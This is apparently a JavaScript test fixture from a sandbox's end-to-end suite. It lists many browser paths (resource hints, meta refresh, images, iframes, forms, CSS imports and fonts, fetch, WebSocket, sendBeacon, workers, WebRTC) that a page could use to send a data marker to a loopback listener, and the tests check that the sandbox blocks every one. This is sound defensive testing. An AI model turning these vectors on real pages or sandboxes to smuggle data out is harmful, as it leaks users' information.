// Every way a page in the sandbox could make the BROWSER ask a loopback listener for something. Each vector builds a
// URL under BASE (`/v/<name>?d=<marker>`, the marker standing for data the page read) and tries; the e2e tests
// (test/e2e-jsx.mjs for a shared page, test/e2e-prod/runner-gate.mjs for an installed app) assert that the listener saw
// NOTHING: no HTTP request, no TCP connection, no UDP packet. Plain script, no imports: it is spliced into fixtures.
//
// `navigation` vectors (the page tries to navigate itself) are the ones measured to still open a connection and look up the
// name; they run on their own, are reported as known limits, and are never part of the zero assertion.

/** Elements for a React tree (rendered by the fixture): every one must come out as nothing or a harmless node. */
function leakJsxVectors(BASE, MARKER) {
  const u = (name) => `${BASE}/v/${name}?d=${MARKER}`;
  return [
    ["link", { rel: "prerender", href: u("jsx-prerender") }],
    ["link", { rel: "prefetch", href: u("jsx-prefetch") }],
    ["link", { rel: "preconnect", href: BASE }],
    ["link", { rel: "dns-prefetch", href: BASE }],
    ["link", { rel: "modulepreload", href: u("jsx-modulepreload") }],
    ["link", { rel: "preload", as: "image", href: u("jsx-preload") }],
    ["link", { rel: "stylesheet", href: u("jsx-stylesheet") }],
    ["meta", { httpEquiv: "refresh", content: `0;url=${u("jsx-meta-refresh")}` }],
    ["a", { href: "#top", ping: u("jsx-ping"), children: "ping" }],
    ["img", { src: u("jsx-img"), alt: "" }],
    ["img", { srcSet: `${u("jsx-srcset")} 1x`, alt: "" }],
    ["video", { src: u("jsx-video"), poster: u("jsx-poster") }],
    ["audio", { src: u("jsx-audio") }],
    ["source", { src: u("jsx-source") }],
    ["track", { src: u("jsx-track") }],
    ["form", { action: u("jsx-form"), method: "get", children: "form" }],
    ["input", { type: "image", src: u("jsx-input-image") }],
    ["object", { data: u("jsx-object") }],
    ["embed", { src: u("jsx-embed") }],
    ["iframe", { src: u("jsx-iframe") }],
    ["base", { href: BASE }],
    ["div", { style: { backgroundImage: `url(${u("jsx-style-url")})` } }],
    ["div", { style: { backgroundImage: `image-set("${u("jsx-style-image-set")}" 1x)` } }],
    ["style", { children: `@import url(${u("jsx-style-import")}); body{background:url(${u("jsx-style-text-url")})}` }],
    ["svg", { children: null }],
    ["div", { dangerouslySetInnerHTML: { __html: `<link rel="prerender" href="${u("jsx-html-prerender")}"><img src="${u("jsx-html-img")}">` } }],
  ];
}

async function runLeakVectors(BASE, MARKER, options) {
  const navigation = options && options.navigation === true;
  const out = {};
  const u = (name) => `${BASE}/v/${name}?d=${MARKER}`;
  const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const only = options && typeof options.only === "string" && options.only !== "" ? options.only.split(",") : null;
  const run = async (name, fn) => {
    if (only !== null && !only.some((prefix) => name.startsWith(prefix))) return;
    console.log(`leak-vector ${name}`);
    try { out[name] = String(await Promise.race([Promise.resolve().then(fn), wait(2500).then(() => "timeout")])); } catch (error) { out[name] = `threw ${error && error.name ? error.name : "Error"}`; }
  };
  const link = (rel, href, extra) => { const node = document.createElement("link"); node.rel = rel; node.href = href; if (extra) for (const [k, v] of Object.entries(extra)) node.setAttribute(k, v); return node; };

  if (navigation) {
    await run("nav-location-href", () => { window.location.href = u("nav-location-href"); return "assigned"; });
    await wait(600);
    await run("nav-location-assign", () => { window.location.assign(u("nav-location-assign")); return "assigned"; });
    await run("nav-anchor-click", () => { const a = document.createElement("a"); a.href = u("nav-anchor"); document.body.append(a); a.click(); return "clicked"; });
    await run("nav-window-open", () => String(window.open(u("nav-window-open"))));
    // A ping is sent when a link is followed, and following a link navigates the frame (a fragment URL resolves against the bridge document): so these run with the navigation vectors. The CSP (connect-src) refuses the ping itself.
    await run("nav-a-ping-detached", () => { const a = document.createElement("a"); a.href = "#top"; a.setAttribute("ping", u("nav-a-ping-detached")); a.click(); return "clicked"; });
    await run("nav-a-ping-set-then-click", () => { const a = document.createElement("a"); a.href = "#top"; document.body.append(a); a.setAttribute("ping", u("nav-a-ping")); a.click(); return "clicked"; });
    await run("nav-a-ping-property", () => { const a = document.createElement("a"); a.href = "#top"; a.ping = u("nav-a-ping-property"); document.body.append(a); a.click(); return "clicked"; });
    await wait(900);
    return out;
  }

  // ---- resource hints, by every insertion path
  for (const rel of ["prerender", "prefetch", "preconnect", "dns-prefetch", "modulepreload", "preload", "stylesheet", "icon", "manifest"]) {
    await run(`link-${rel}-append`, () => { document.head.append(link(rel, rel === "preconnect" || rel === "dns-prefetch" ? BASE : u(`link-${rel}-append`), rel === "preload" ? { as: "image" } : undefined)); return "appended"; });
  }
  await run("link-appendChild", () => { document.head.appendChild(link("prerender", u("link-appendChild"))); return "done"; });
  await run("link-insertBefore", () => { document.head.insertBefore(link("prefetch", u("link-insertBefore")), document.head.firstChild); return "done"; });
  await run("link-prepend", () => { document.head.prepend(link("prerender", u("link-prepend"))); return "done"; });
  await run("link-insertAdjacentElement", () => { document.head.insertAdjacentElement("beforeend", link("prerender", u("link-insertAdjacentElement"))); return "done"; });
  await run("link-insertAdjacentHTML", () => { document.head.insertAdjacentHTML("beforeend", `<link rel="prerender" href="${u("link-insertAdjacentHTML")}">`); return "done"; });
  await run("link-innerHTML", () => { const box = document.createElement("div"); document.body.append(box); box.innerHTML = `<link rel="prerender" href="${u("link-innerHTML")}">`; return "done"; });
  await run("link-outerHTML", () => { const box = document.createElement("div"); document.body.append(box); box.outerHTML = `<link rel="prefetch" href="${u("link-outerHTML")}">`; return "done"; });
  await run("link-range-insertNode", () => { const range = document.createRange(); range.selectNodeContents(document.head); range.collapse(false); range.insertNode(link("prerender", u("link-range-insertNode"))); return "done"; });
  await run("link-contextualFragment", () => { document.head.append(document.createRange().createContextualFragment(`<link rel="prerender" href="${u("link-contextualFragment")}">`)); return "done"; });
  await run("link-template", () => { const template = document.createElement("template"); template.innerHTML = `<link rel="prerender" href="${u("link-template")}">`; document.head.append(template.content.cloneNode(true)); return "done"; });
  await run("link-domparser", () => { const parsed = new DOMParser().parseFromString(`<link rel="prerender" href="${u("link-domparser")}">`, "text/html"); const node = parsed.querySelector("link"); document.head.append(document.adoptNode(node)); return "done"; });
  await run("link-shadow-innerHTML", () => { const host = document.createElement("div"); document.body.append(host); host.attachShadow({ mode: "open" }).innerHTML = `<link rel="prerender" href="${u("link-shadow-innerHTML")}">`; return "done"; });
  await run("link-shadow-append", () => { const host = document.createElement("div"); document.body.append(host); host.attachShadow({ mode: "open" }).append(link("prerender", u("link-shadow-append"))); return "done"; });
  await run("link-setHTMLUnsafe", () => { const box = document.createElement("div"); document.body.append(box); if (typeof box.setHTMLUnsafe !== "function") return "n/a"; box.setHTMLUnsafe(`<link rel="prerender" href="${u("link-setHTMLUnsafe")}">`); return "done"; });
  await run("link-attribute-after-insert", async () => { const node = document.createElement("link"); document.head.append(node); node.setAttribute("rel", "prerender"); node.setAttribute("href", u("link-attribute-after-insert")); await wait(50); return "done"; });
  await run("link-property-after-insert", async () => { const node = document.createElement("link"); node.rel = "prefetch"; document.head.append(node); node.href = u("link-property-after-insert"); await wait(50); return "done"; });
  await run("link-in-body-then-moved", async () => { const node = link("prerender", u("link-moved")); document.body.append(node); document.head.append(node); return "done"; });

  // ---- meta refresh
  await run("meta-refresh", () => { const node = document.createElement("meta"); node.httpEquiv = "refresh"; node.content = `0;url=${u("meta-refresh")}`; document.head.append(node); return "done"; });
  await run("meta-refresh-innerHTML", () => { document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="refresh" content="0;url=${u("meta-refresh-html")}">`); return "done"; });

  // ---- <a ping>, images, media, frames, objects, SVG, forms
  await run("img-append", () => { const img = document.createElement("img"); img.src = u("img-append"); document.body.append(img); return "done"; });
  await run("img-new-Image", () => { const img = new Image(); img.src = u("img-new-image"); return "done"; });
  await run("img-srcset", () => { const img = document.createElement("img"); img.srcset = `${u("img-srcset")} 1x`; document.body.append(img); return "done"; });
  await run("picture-source", () => { const picture = document.createElement("picture"); const source = document.createElement("source"); source.srcset = u("picture-source"); picture.append(source, document.createElement("img")); document.body.append(picture); return "done"; });
  await run("video-poster", () => { const video = document.createElement("video"); video.poster = u("video-poster"); video.src = u("video-src"); document.body.append(video); return "done"; });
  await run("audio-new-Audio", () => { const audio = new Audio(u("audio-new-audio")); audio.load(); return "done"; });
  await run("track", () => { const video = document.createElement("video"); const track = document.createElement("track"); track.src = u("track"); video.append(track); document.body.append(video); return "done"; });
  await run("iframe", () => { const frame = document.createElement("iframe"); frame.src = u("iframe"); document.body.append(frame); return "done"; });
  await run("iframe-srcdoc", () => { const frame = document.createElement("iframe"); frame.srcdoc = `<img src="${u("iframe-srcdoc")}">`; document.body.append(frame); return "done"; });
  await run("object", () => { const node = document.createElement("object"); node.data = u("object"); document.body.append(node); return "done"; });
  await run("embed", () => { const node = document.createElement("embed"); node.src = u("embed"); document.body.append(node); return "done"; });
  await run("svg-image", () => { const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg"); const image = document.createElementNS("http://www.w3.org/2000/svg", "image"); image.setAttribute("href", u("svg-image")); svg.append(image); document.body.append(svg); return "done"; });
  await run("svg-use", () => { const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg"); const use = document.createElementNS("http://www.w3.org/2000/svg", "use"); use.setAttribute("href", u("svg-use")); svg.append(use); document.body.append(svg); return "done"; });
  await run("form-submit", () => { const form = document.createElement("form"); form.action = u("form-submit"); form.method = "get"; document.body.append(form); form.submit(); return "done"; });
  await run("form-requestSubmit", () => { const form = document.createElement("form"); form.action = u("form-requestSubmit"); document.body.append(form); form.requestSubmit(); return "done"; });
  await run("form-button-click", () => { const form = document.createElement("form"); form.action = u("form-button"); const button = document.createElement("button"); form.append(button); document.body.append(form); button.click(); return "done"; });
  await run("form-formaction", () => { const form = document.createElement("form"); const button = document.createElement("button"); button.setAttribute("formaction", u("form-formaction")); form.append(button); document.body.append(form); button.click(); return "done"; });
  await run("base-href", () => { const base = document.createElement("base"); base.href = BASE + "/"; document.head.append(base); const a = document.createElement("a"); a.href = "relative"; document.body.append(a); return "done"; });

  // ---- CSS
  await run("css-style-url", () => { const style = document.createElement("style"); style.textContent = `body{background:url(${u("css-style-url")})}`; document.head.append(style); return "done"; });
  await run("css-style-import", () => { const style = document.createElement("style"); style.textContent = `@import url(${u("css-style-import")});`; document.head.append(style); return "done"; });
  await run("css-style-image-set", () => { const style = document.createElement("style"); style.textContent = `body{background:image-set("${u("css-image-set")}" 1x)}`; document.head.append(style); return "done"; });
  await run("css-style-font-face", () => { const style = document.createElement("style"); style.textContent = `@font-face{font-family:L;src:url(${u("css-font-face")})}body{font-family:L}`; document.head.append(style); return "done"; });
  await run("css-text-after-insert", () => { const style = document.createElement("style"); document.head.append(style); style.textContent = `@import url(${u("css-text-after-insert")});body{background:url(${u("css-text-after-insert-url")})}`; return "done"; });
  await run("css-inline-attr", () => { const div = document.createElement("div"); div.setAttribute("style", `background:url(${u("css-inline-attr")})`); document.body.append(div); return "done"; });
  await run("css-inline-property", () => { const div = document.createElement("div"); document.body.append(div); div.style.backgroundImage = `url(${u("css-inline-property")})`; return "done"; });
  await run("css-constructable", () => { const sheet = new CSSStyleSheet(); sheet.replaceSync(`body{background:url(${u("css-constructable")})}`); document.adoptedStyleSheets = [sheet]; return "done"; });
  await run("css-insertRule", () => { const style = document.createElement("style"); document.head.append(style); style.sheet.insertRule(`body{background:url(${u("css-insertRule")})}`); return "done"; });
  await run("css-fonts-load", () => { const face = new FontFace("Lf", `url(${u("css-fontface-api")})`); document.fonts.add(face); return face.load().then(() => "loaded", () => "refused"); });

  // ---- scripted requests and the rest
  await run("fetch", () => fetch(u("fetch")).then(() => "loaded", () => "refused"));
  await run("fetch-no-cors", () => fetch(u("fetch-no-cors"), { mode: "no-cors", keepalive: true }).then(() => "loaded", () => "refused"));
  await run("xhr", () => new Promise((resolve) => { const x = new XMLHttpRequest(); x.onerror = () => resolve("refused"); x.onload = () => resolve("loaded"); x.open("GET", u("xhr")); x.send(); }));
  await run("websocket", () => new Promise((resolve) => { const s = new WebSocket(u("websocket").replace("http", "ws")); s.onerror = () => resolve("refused"); s.onopen = () => resolve("open"); setTimeout(() => resolve("silent"), 700); }));
  await run("eventsource", () => new Promise((resolve) => { const s = new EventSource(u("eventsource")); s.onerror = () => resolve("refused"); s.onopen = () => resolve("open"); setTimeout(() => resolve("silent"), 700); }));
  await run("sendBeacon", () => navigator.sendBeacon(u("sendBeacon"), "x"));
  await run("import", () => import(u("import")).then(() => "loaded", () => "refused"));
  await run("worker", () => { const w = new Worker(u("worker")); return new Promise((resolve) => { w.onerror = () => resolve("refused"); setTimeout(() => resolve("silent"), 500); }); });
  await run("importScripts-blob-worker", () => { const w = new Worker(URL.createObjectURL(new Blob([`importScripts(${JSON.stringify(u("blob-worker"))})`]))); return new Promise((resolve) => { w.onerror = () => resolve("refused"); setTimeout(() => resolve("silent"), 500); }); });
  await run("webrtc", () => new Promise((resolve) => {
    const Peer = window.RTCPeerConnection || window.webkitRTCPeerConnection;
    if (typeof Peer !== "function") { resolve("removed"); return; }
    const peer = new Peer({ iceServers: [{ urls: `stun:${new URL(BASE).host}` }] });
    peer.createDataChannel("probe");
    peer.onicecandidate = (event) => { if (event.candidate === null) resolve("gathered"); };
    peer.createOffer().then((offer) => peer.setLocalDescription(offer)).catch((error) => resolve(error.name));
    setTimeout(() => resolve("silent"), 2500);
  }));

  await wait(1200);
  return out;
}
